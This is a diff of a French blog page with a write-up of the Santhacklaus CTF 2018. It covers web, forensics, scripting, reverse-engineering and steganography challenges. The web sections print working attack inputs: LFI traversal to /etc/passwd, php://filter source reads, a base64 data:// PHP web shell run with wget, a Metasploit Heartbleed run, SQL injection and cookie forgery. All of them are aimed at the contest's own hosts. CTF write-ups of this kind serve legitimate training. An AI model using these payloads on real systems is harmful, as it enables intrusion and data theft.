@@ -203,9 +203,9 @@
 
   </header>
   <div class="post">
-    <p>Le Santhacklaus CTF 2018 est un challenge Jeopardy en ligne, organisé par quatre étudiants de l&rsquo;IMT Lille Douai <!-- raw HTML omitted -->@_nwodtuhs<!-- raw HTML omitted --> <!-- raw HTML omitted -->@m3lsius<!-- raw HTML omitted --> <!-- raw HTML omitted -->@Ch3n4p4N<!-- raw HTML omitted --> <!-- raw HTML omitted -->@Deldel<!-- raw HTML omitted -->. Cet article traite des différents challenges que j&rsquo;ai réussi et eu le temps de faire.</p>
+    <p>Le Santhacklaus CTF 2018 est un challenge Jeopardy en ligne, organisé par quatre étudiants de l&rsquo;IMT Lille Douai <a href="https://twitter.com/_nwodtuhs" target="blank">@_nwodtuhs</a> <a href="https://twitter.com/m3lsius" target="blank">@m3lsius</a> <a href="https://twitter.com/Ch3n4p4N" target="blank">@Ch3n4p4N</a> <a href="https://twitter.com/Th4cho" target="blank">@Deldel</a>. Cet article traite des différents challenges que j&rsquo;ai réussi et eu le temps de faire.</p>
 <p>D&rsquo;une durée d&rsquo;une semaine, du 14/12 au 21/12, la compétition est également un projet étudiant réalisé dans le cadre de la formation des 4 auteurs. De mon point de vue, des challenges plutôt fun et intéressants. Je n&rsquo;ai pu le commencer qu&rsquo;à 2 jours et demi de la fin donc malheureusement pour moi je n&rsquo;ai pas eu le temps de me pencher sur les challenges les plus intéressants. C&rsquo;est néanmoins une 33e place avec 4390 points !</p>
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/santhacklausctf-2018/scoreChallengesHaax.png" alt="Santhacklaus Challenges" class="imgSize"/></center>
 <h3 id="sommaire">Sommaire</h3>
 <ul>
 <li><a href="#tl-dr">TL;DR</a></li>
@@ -405,7 +405,8 @@
 <p>Simple challenge d&rsquo;introduction, pas de ressource sur laquelle taper. Le but du challenge tourne autour des erreurs 404.  Ainsi, on tente d&rsquo;accéder via la plateforme à une ressource inexistante.</p>
 <p><a href="https://santhacklaus.xyz/zzzz">https://santhacklaus.xyz/zzzz</a></p>
 <p>Et on se retrouve avec une page &ldquo;404&rdquo; personnalisée, affichant le premier flag : IMTLD{Th3_P4g3_w4s_n0T_f0uNd}.</p>
-<!-- raw HTML omitted -->
+<br/>
+### Authentication 2.0 - 100 pts
 <p>L&rsquo;énoncé &ldquo;Did you GET it&rdquo; indique clairement que le challenge tourne autour de la manipulation de méthodes HTTP. Ainsi, avec l&rsquo;utilitaire <code>curl</code>, il est possible de réaliser différentes requêtes. Une requête GET classique demande à l&rsquo;utilisateur d&rsquo;envoyer son nom d&rsquo;utilisateur (username) pour s&rsquo;authentifier.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -X GET https://authentication.santhacklaus.xyz/
 </code></pre></div><p>Après quelques recherches sur un possible paramètre caché, j&rsquo;ai tenté de passer par la méthode POST. On récupère un retour différent demandant maintenant quel est notre nom d&rsquo;utilisateur.</p>
@@ -415,7 +416,8 @@
 </code></pre></div><p>La requête passe correctement mais le site nous indique que l&rsquo;utilisateur Haax ne dispose pas des permissions requises pour s&rsquo;authentifier. Étant donné qu&rsquo;il s&rsquo;agit d&rsquo;un challenge simple, on ne cherche pas très loin et on tente une requête avec l&rsquo;username &ldquo;admin&rdquo;.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -X POST https://authentication.santhacklaus.xyz/ --data <span style="color:#e6db74">&#34;username=admin&#34;</span>
 </code></pre></div><p>Le site nous répond avec le flag IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3} ! :)</p>
-<!-- raw HTML omitted -->
+<br/>
+### The flag grabber - 150 pts
 <p>Il s&rsquo;agit ici d&rsquo;un challenge axé sur le Javascript. On arrive sur une page web contenant le code suivant.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cursor&#34;</span>&gt;
 &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;I want my flag !&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false_button&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;message()&#34;</span>&gt;
@@ -469,7 +471,8 @@ document.<span style="color:#a6e22e">onmousemove</span> <span style="color:#f926
 <p>Pour ce qui est du formulaire, la propriété CSS <code>visibility: hidden</code> permet de le cacher. Il suffit ainsi d&rsquo;ouvrir l&rsquo;inspecteur d&rsquo;éléments et de décocher la case la propriété pour voir s&rsquo;afficher le vrai bouton. Cependant, on ne peut pas encore cliquer dessus, à cause du faux bouton suivant la souris.</p>
 <p>Pour cela, une méthode simple est de changer l&rsquo;identifiant du bouton dans le code HTML. En effet, on voit dans le code JavaScript que les opérations sont effectuées sur l&rsquo;élément HTML possédant l&rsquo;identifiant &ldquo;cursor&rdquo;. Ainsi, si dans l&rsquo;inspecteur, on modifie en direct l&rsquo;identifiant du faux bouton par une autre valeur, ce dernier s&rsquo;arrête de bouger et ne suit plus la souris.</p>
 <p>Ainsi, on peut soumettre le vrai formulaire et voir s&rsquo;afficher le flag IMTLD{J4v4scRipT_iS_W0nD3rFuL}.</p>
-<!-- raw HTML omitted -->
+<br/>
+### Arch Drive 1/3 - 150 pts
 <p>Premier challenge d&rsquo;une série de 5 challenges. On arrive sur la mire d&rsquo;authentification à un supposé service de stockage en ligne. Deux possibilités, tenter de bypass le formulaire de connexion ou tenter de passer par le reset du mot de passe. Quelques injections rapides sont tentées mais on se dirige rapidement vers la fonction de reset. Cette page est appelée de la façon suivante.</p>
 <pre><code>https://archdrive.santhacklaus.xyz/?page=reset.php
 </code></pre><p>Premier réflexe : LFI !</p>
@@ -478,7 +481,8 @@ document.<span style="color:#a6e22e">onmousemove</span> <span style="color:#f926
 </code></pre><p>Ce qui nous donne le premier flag.. :)
 Ce challenge est simple mais il permet de montrer le point d&rsquo;entrée vers la suite.</p>
 <pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash 
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### Arch Drive 2/3 - 150 pts
 <p>Suite du scénario, et dernier challenge pour ma part. Je n&rsquo;ai pas eu le temps de me pencher en détails sur les suivants.</p>
 <p>A ce stade, on dispose d&rsquo;une LFI. On a donc plusieurs possibilités. Ne connaissant que peu de fichiers accessibles (reset.php?) on va essayer de récupérer le plus d&rsquo;informations possible, en lisant par exemple le code source du site web. Une façon relativement simple de parvenir à cela est d&rsquo;utiliser les wrappers PHP. L&rsquo;un des plus connus est le wrapper &ldquo;php://filter&rdquo; permettant notamment d&rsquo;encoder le contenu d&rsquo;un fichier en base64, ce qui permet ensuite de récupérer le contenu du fichier, qui ne sera pas interprété car encodé.</p>
 <pre><code>https://archdrive.santhacklaus.xyz/?page=php://filter/convert.base64-encode/resource=reset.php
@@ -514,7 +518,8 @@ Ce challenge est simple mais il permet de montrer le point d&rsquo;entrée vers 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ fcrackzip -u -D -p rockyou.txt recup.zip
 </code></pre></div><p>Assez rapidement, le mot de passe &ldquo;hackerman&rdquo; est trouvé. On peut décompresser l&rsquo;archive et ainsi récupérer le flag IMTLD{F1nd_Y0uR_W4y} dans un fichier &ldquo;password.txt&rdquo;.</p>
 <p>NOTE : La suite du challenge semble se passer du côté des conteneurs VeraCrypt. Si vous voulez lire la solution, n&rsquo;hésitez pas à aller voir du côté de <a href="https://maki.bzh/courses/blog/writeups/santhacklaus2018/">https://maki.bzh/courses/blog/writeups/santhacklaus2018/</a></p>
-<!-- raw HTML omitted -->
+<br/>
+### SHRT -  200 pts
 <p>Burp Suite time ! En observant les requêtes, on remarque la présence d&rsquo;un cookie étrange :</p>
 <pre><code>Cookie: connexion= 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
 </code></pre><p>La chaine hexa donnée fait 64 caractères de long, ce qui correspond à un hash SHA256. Un rapide tour sur les bases de données de hash connues révèle la signification de ce dernier : &ldquo;stranger&rdquo;. Ok. A partir de là, si on veut passer, peut être faut-il construire un cookie de connexion en administrateur ?</p>
@@ -541,7 +546,8 @@ Upgrade-Insecure-Requests: 1
  - Consult secret documents
 
 Well done ! Take your flag: IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### Jeanclaude.vd - 250 pts
 <p>Atterissage sur une fan page statique de Jean-Claude Van Damme. Quelques recherches classiques nous font aller vers le fichier &ldquo;robots.txt&rdquo;.</p>
 <pre><code>todo.txt
 admin.html
@@ -565,7 +571,8 @@ DONE      Drink water, regularly
 	Congratz ! Here is the flag IMTLD{ID04L0t0f1s0m3tr1cs}
 &lt;/BODY&gt;
 &lt;/HTML&gt;
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### Be my Valentine - 400 pts
 <p>Le nom, l&rsquo;énoncé &ldquo;Take care of your heart (maybe also your eyes).&rdquo; ainsi que l&rsquo;image d&rsquo;un grand coeur me fait directement penser à l&rsquo;exploitation de la CVE-2014-0160 plus connue sous le nom de &ldquo;Heartbleed&rdquo;. Une adresse IP ainsi qu&rsquo;un port sont donnés <code>51.75.202.113:1073</code>. Il s&rsquo;agit d&rsquo;un blog sans intérêt particulier.</p>
 <p>Pour l&rsquo;identification et l&rsquo;exploitation de la potentielle vulnérabilité, l&rsquo;exploit intégré au framework Metasploit est utilisé. Un détail qui m&rsquo;a fait chercher un petit peu avant de comprendre pourquoi je ne récupérais rien, la version de TLS utilisée par le serveur. Je n&rsquo;y avais pas fait attention et avais laissé la valeur par défaut dans l&rsquo;exploit.. Il s&rsquo;agit en fait de TLS 1.2, visible au niveau du certificat.</p>
 <pre><code>&gt; use auxiliary/scanner/ssl/openssl_heartbleed
@@ -581,10 +588,11 @@ DONE      Drink water, regularly
 <pre><code>[+] 51.75.202.113:1073    - Heartbeat response with leak, 65535 bytes
 [*] 51.75.202.113:1073    - Printable info leaked:
 ......\.pp......%..765.........}S.C.....f.....&quot;.!.9.8.........5.............................3.2.....E.D...../...A.......................................w-form-urlencoded....IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}\:.`..?..h.)
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### 3D Industry (1/2) - 400 pts
 <p>Le challenge débute ici sur le site d&rsquo;une petite entreprise. Plusieurs pages sont accessibles de cette façon :</p>
 <pre><code>https://3d-industry.santhacklaus.xyz/index.php?file=creations.php
-</code></pre><p>Une fois encore, premier réflexe : LFI ! Afin d&rsquo;effectuer mes tests, je me suis basé sur l&rsquo;excellent dépôt Github de Swissky : <!-- raw HTML omitted -->PayloadAllTheThings<!-- raw HTML omitted -->.</p>
+</code></pre><p>Une fois encore, premier réflexe : LFI ! Afin d&rsquo;effectuer mes tests, je me suis basé sur l&rsquo;excellent dépôt Github de Swissky : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal" target="\_blank">PayloadAllTheThings</a>.</p>
 <p>Après quelques tests, on arrive à l&rsquo;utilisation du wrapper PHP data://. Celui ci permet d&rsquo;envoyer des données, encodées par exemple en base64. Il est ainsi possible par exemple d&rsquo;envoyer du php qui peut être interprété par le serveur. Par exemple, le payload suivant peut être tenté :</p>
 <pre><code># Payload
 &quot;&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;&quot;
@@ -604,16 +612,19 @@ accueil.php admin config contact.php creations.php inc index.php lang lang.php s
 
 Well done ! You can validate with the flag:
 IMTLD{B3w4r30fURL1nclud3}Shell done !
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### 3D Industry (2/2) - 200 pts
 <p>La suite du challenge n&rsquo;est plus tellement du web mais plutôt de la stéganographie/MISC puisqu&rsquo;il s&rsquo;agit de récupérer et exploiter des données. L&rsquo;énoncé indique que le dirigeant est maintenant inquiet à propos des uploads de fichiers, dans la section d&rsquo;administration</p>
 <p>Toujours via l&rsquo;exploitation de la LFI, on fouille le serveur en direction de la section d&rsquo;uploads de fichiers et on y trouve un fichier <code>admin/uploads/s3cr37-d0cum3n7.txt</code> contenant une très longue chaine qui semble être de la base64.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget -O 3D.txt https://3d-industry.santhacklaus.xyz/index.php<span style="color:#ae81ff">\?</span>file<span style="color:#ae81ff">\=</span>data://text/plain<span style="color:#ae81ff">\;</span>base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4<span style="color:#ae81ff">\=\&amp;</span>cmd<span style="color:#ae81ff">\=</span>file:///index.php%3Ffile<span style="color:#ae81ff">\=</span>data://text/plain%3bbase64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4<span style="color:#ae81ff">\=\&amp;</span>cmd<span style="color:#ae81ff">\=</span>cat%20admin/uploads/s3cr37ed0cum3n7.txt
 </code></pre></div><p>Une fois la base64 isolée et décodée, on observe au début la chaine suivante &ldquo;SketchUp STL com.sketchup.SketchUp.2018&rdquo;. Je connaissais déjà le logiciel sketchup, permettant de faire de la modélisation 3D. On a donc un fichier. On redirige donc la base64 dans un fichier &ldquo;3D_industry.stl&rdquo;.</p>
 <p>Après quelques recherches, je me suis aperçu que Sketchup dispose d&rsquo;un éditeur en ligne ! Parfait, ça m&rsquo;évite d&rsquo;installer le logiciel et ça me convient très bien. On peut donc importer le fichier sur l&rsquo;éditeur et voir le flag s&rsquo;afficher ! :)</p>
-<!-- raw HTML omitted -->
+<br/>
+## Forensics et réseau
 <h3 id="playa-del-fuego---50-pts">Playa Del Fuego - 50 pts</h3>
 <p>Le challenge démarre avec un PDF sur lequel une partie du texte est cachée par une bande noire. Il est demandé de retrouver le contenu du texte caché. Une simple copie du texte du document vers un éditeur de texte révèle la présence de la bande cachée, et donc du flag IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}.</p>
-<!-- raw HTML omitted -->
+<br/>
+### What's his name ? - 100 pts
 <p>La capture réseau fournie avec le challenge concerne des échanges réalisés avec telnet. Le traffic étant en clair, il est possible de retrouver le contenu des échanges avec Wireshark en utilisant la fonctionnalité &ldquo;Follow TCP stream&rdquo;. Ainsi on récupère le contenu suivant, contenant le mot de passe de l&rsquo;utilisateur.</p>
 <pre><code>........... ..!..&quot;..'.....#..... ..#..'........!..&quot;..... .....#.....'.............h.7.... .38400,38400....#.nani.lan:1....'..DISPLAY.nani.lan:1......xterm-256color..............Debian GNU/Linux 7
 debian login: jjcceennaa
@@ -622,7 +633,8 @@ Password: W4tch4_W4tch4
 .
 Last login: Tue Oct 30 05:27:07 CDT 2018 from 172.27.191.154 on pts/0
 Linux debian 3.2.0-4-686-pae #1 SMP Debian 3.2.96-2 i686
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### Pong - 200 pts
 <p>La capture de trames réseau fournie pour ce challenge contient plusieurs milliers de trame ICMP. Il s&rsquo;agit en réalité d&rsquo;une exfiltration de données via le protocole ICMP. En effet, il est possible d’exfiltrer une faible quantité de données dans le champ data d&rsquo;un ping. Après quelques essais et observations sur le contenu de quelques trames, on observe que les données exfiltrées ressemblent à de la base64. J&rsquo;ai automatisé l&rsquo;extraction avec le script <code>python</code> suivant (dégueulasse, je vous l&rsquo;accorde).</p>
 <pre><code>#!/usr/bin/env python
 
@@ -644,7 +656,8 @@ output_file = open(&quot;result.b64&quot;, &quot;w&quot;)
 output_file.write(output)
 output_file.close()
 </code></pre><p>Par la suite, on décode la base64 pour s&rsquo;apercevoir qu&rsquo;il s&rsquo;agit d&rsquo;un fichier PNG, laissant apparaître le flag IMTLD{4_s1mpl3_3xfilTR4t1oN_tECHNIQUe}.</p>
-<!-- raw HTML omitted -->
+<br/>
+### Volatility101 - 250 pts
 <p>Super challenge d&rsquo;introduction/rappels à volatility ! On démarre avec un dump de RAM d&rsquo;un Windows qu&rsquo;il faut analyser. Le challenge est composé de trois parties :</p>
 <ul>
 <li>Partie 1 - Récupérer le nom de la machine ;</li>
@@ -726,7 +739,8 @@ DataSectionObject 0x3e067440   None   \Device\HarddiskVolume2\Users\John\Desktop
 
 PASSWORD FOUND!!!!: pw == iamahacker
 </code></pre><p>On récupère ainsi la dernière partie du flag &ldquo;F0r3ns1cCLUB&rdquo; ce qui permet de créer le flag de l&rsquo;épreuve IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}.</p>
-<!-- raw HTML omitted -->
+<br/>
+## App Scripts & Programmation
 <h3 id="mental-arithmetic---150-pts">Mental arithmetic - 150 pts</h3>
 <p>Le but de ce challenge est de se connecter à une machine distante afin d&rsquo;y récupérer deux nombres, d&rsquo;effectuer une opération entre ces derniers et de renvoyer le résultat rapidement au serveur.</p>
 <p>Je me suis dit pour cela que c&rsquo;était l&rsquo;occasion d&rsquo;essayer la librairie Python <code>pwntools</code>  ! Ainsi, ci-dessous le script (dégueulasse également..) que j&rsquo;ai utilisé :)</p>
@@ -780,7 +794,8 @@ I almost forget, you only have <span style="color:#ae81ff">2</span> seconds to s
 Congratz!! Flag : IMTLD<span style="color:#f92672">{</span>TheFastestManAlive<span style="color:#f92672">}</span>
 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 51.75.202.113 port <span style="color:#ae81ff">10001</span>
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
+### On the road again - 150 pts
 <p>Le challenge démarre sur une machine sur laquelle nous avons accès à un binaire et son code source. Le but du challenge est d&rsquo;afficher le contenu du fichier &ldquo;.flag&rdquo;.</p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -796,7 +811,8 @@ $ ./ch1
 
 #!/bin/cat
 IMTLD{Th1s0neW4sSymPATH3t1c2}
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### QREncoded - 150 pts
 <p>Le challenge est composé de plusieurs centaines de QRcodes qu&rsquo;il faut décoder et assembler. Le décodage de quelques uns d&rsquo;entre eux semble donner de la base64. Ainsi, le challenge semble être de décoder les QRcodes un par afin d&rsquo;obtenir une chaine en base64, à décoder.</p>
 <p>Le tout peut se faire en une ligne de bash :</p>
 <pre><code>for index in {0..843}; do zbarimg -q --raw part_$index.png ; done | tr -d '\n' | base64 -d &gt;&gt; result
@@ -804,7 +820,8 @@ IMTLD{Th1s0neW4sSymPATH3t1c2}
 <pre><code>&gt; $ file result                                                                                                                                                              
 result: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.6, datetime=2018:11:15 22:24:26], progressive, precision 8, 423x532, components 3
 </code></pre><p>On obtient donc une jolie image JPEG nous donnant le flag IMTLD{qrCODES_R_3v1l}.</p>
-<!-- raw HTML omitted -->
+<br/>
+## Reverse Engineering
 <h3 id="crackme-1---150-pts">Crackme 1 - 150 pts</h3>
 <p>Le premier challenge de reverse demande un mot de passe en argument, le vérifie, et affiche &ldquo;password incorrect&rdquo; ou le flag en fonction du mot de passe utilisé.</p>
 <p>Nul besoin de rentrer dans les détails du binaire pour ce premier challenge (un peu de répit avant la souffrance&hellip;) puisqu&rsquo;une simple étude des appels aux librairies effectués, à l&rsquo;aide de <code>ltrace</code> permet d&rsquo;obtenir le mot de passe de l&rsquo;application&hellip;</p>
@@ -820,8 +837,9 @@ puts(&quot;Password incorrect&quot;Password incorrect
 Access granted !
 Flag : IMTLD{Y0uAr34H4ck3rH4rry}
 
-</code></pre><!-- raw HTML omitted -->
-<p>On rentre ici dans le vif du sujet ! Merci à <!-- raw HTML omitted -->@Tomtombinary<!-- raw HTML omitted --> qui m&rsquo;a aidé pour la résolution de ce challenge notamment en répondant à mes trop nombreuses questions :D. Je passe l&rsquo;ensemble de l&rsquo;analyse du binaire pour me concentrer uniquement sur les parties intéressantes.</p>
+</code></pre><br/>
+### Crackme 2 - 250 pts
+<p>On rentre ici dans le vif du sujet ! Merci à <a href="https://twitter.com/tomtombinary" target="\_blank">@Tomtombinary</a> qui m&rsquo;a aidé pour la résolution de ce challenge notamment en répondant à mes trop nombreuses questions :D. Je passe l&rsquo;ensemble de l&rsquo;analyse du binaire pour me concentrer uniquement sur les parties intéressantes.</p>
 <p>A l&rsquo;aide de <code>gdb</code> on peut récupérer les instructions assembleurs du binaire. Deux choses sont à remarquer. Premièrement, on observe ce qui est chargé par le programme à son lancement. On s&rsquo;aperçoit que le programme charge un tas de données qui s&rsquo;avèrent être des caractères.</p>
 <pre><code>(gdb) disas main
 Dump of assembler code for function main:
@@ -951,7 +969,8 @@ Dump of assembler code for function main:
 &gt;&gt;&gt; chn
 'aTmx8DkUVdTqJfuwUIMTLD{Th1s1sN0tCh34t1ng}U'
 </code></pre><p>On récupère donc le flag IMTLD{Th1s1sN0tCh34t1ng}.</p>
-<!-- raw HTML omitted -->
+<br/>
+## Stéganographie et Cryptographie
 <h3 id="slept-on-the-keyboard---50-pts">Slept on the keyboard - 50 pts</h3>
 <p>Le challenge démarre avec un QRcode à scanner. Ce dernier donne une chaine binaire.</p>
 <pre><code>$ zbarimg qrcode.png -q --raw
@@ -965,12 +984,14 @@ QR-Code:001110010011100100111001001110010110010001100100011001000110010000110100
 <li>44444 &ndash;&gt; 5 fois le chiffre 4 &ndash;&gt; 54 &ndash;&gt; La lettre &ldquo;T&rdquo; en hex</li>
 </ul>
 <p>En suivant cette logique, on retrouve assez rapidement le flag IMTLD{C4t0nTh3K3yb04rd}.</p>
-<!-- raw HTML omitted -->
+<br/>
+### Xtracted - 100 pts
 <p>Le fichier &ldquo;encoded.wtf&rdquo; est en réalité un fichier texte composé des caractères suivants.</p>
 <pre><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++.-.++++.+.&lt;++.+++++++++++++++.---------------.&gt;------------.++++++++++++..----.&lt;+++++++++++++++.++.---.+++.&lt;++++++++++.&gt;&gt;--------.&gt;+++++++++++.++++.+.&lt;&lt;+++++++++.&lt;++++++++++++++++++++++.&gt;-----.----.---.+++++++++.--.-------.++++.--.++.----.+++..++.&lt;++++++++++.&gt;&gt;-----.&gt;-----.-.++++++.---------------.+++++++++.++++++.&lt;&lt;------.&gt;+++++++++++++++++.&gt;+++++.---------.-----------.&lt;&lt;+++++++++++++.&lt;++++++++++++++++++++++.&gt;&gt;&gt;----.+++++++++++++++..----.---.------.--.+++++++++++++++++++.-----------.++++++.-.&lt;&lt;-----------.&gt;&gt;++++++++++.&lt;&lt;--.&gt;&gt;-...&lt;&lt;.&gt;&gt;-----------------.+++++++++.+++.-----.&lt;&lt;.&gt;&gt;++++++++.---.------.-------.+++++++++.-----------.++++++++++++.-----------.+.-.&lt;&lt;&lt;++++++++++.&gt;&gt;&gt;+.+++++++++++++++++++.----.--.&lt;+++++++++++++.++.&gt;++.&lt;++++++.&gt;-----.-.&lt;----------.&gt;-----.+++++.&lt;+++++++.&gt;+.&lt;&lt;++++++++++++++++.++++++++++++.++++.+++++++.--------.--------.&gt;&gt;++++++++++++.&lt;--------------.&gt;-------.--.&lt;&lt;----------------.&gt;+++++++++++.&gt;++.&lt;----.&lt;++++++++++++++++.----------------.&gt;&gt;.&lt;&lt;.&gt;.-----------.&lt;----.&gt;+++++++++++.&gt;--.&lt;&lt;+++.&gt;&gt;-----.&lt;&lt;---.&gt;&gt;+++++++.&lt;&lt;+++.&gt;.&gt;-.&lt;&lt;.&gt;&gt;-.++++.&lt;&lt;.&gt;-------------.&gt;+++++++.
 </code></pre><p>Assez rapidement, on se rend compte qu&rsquo;il s&rsquo;agit d&rsquo;un texte codé en langage &ldquo;Brainfuck&rdquo;. Ainsi, on peut le décoder avec un utilitaire en ligne et retrouver le flag :).</p>
 <pre><code>POST / HTTP/1.1 Host:*51.75.202.1134Content-Type:Japplication/x-www-form-urlencodedTextraction_info=IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
+### Stego101 - 150 pts
 <p>Ce challenge permet de retrouver deux concepts très simples que l&rsquo;ont peut voir dans les premiers challenges de stéganographie. La première étape est d&rsquo;aller regarder du côté des métadonnées. On y trouve notamment un commentaire &ldquo;steghide : doyouknowdaway&rdquo;.</p>
 <pre><code>$ exiftool challenge.jpg                                                                                                                                                   
 ExifTool Version Number         : 11.11
@@ -1002,7 +1023,8 @@ Megapixels                      : 0.045
 Enter passphrase: 
 wrote extracted data to &quot;flag.txt&quot;.
 </code></pre><p>Le fichier contient le flag IMTLD{st3g4N0gr4phY_c4N_b3_r34llY_s1mpl3}.</p>
-<!-- raw HTML omitted -->
+<br/>
+## Le mot de la fin
 <p>Vivement la prochaine édition !</p>
   </div>
   
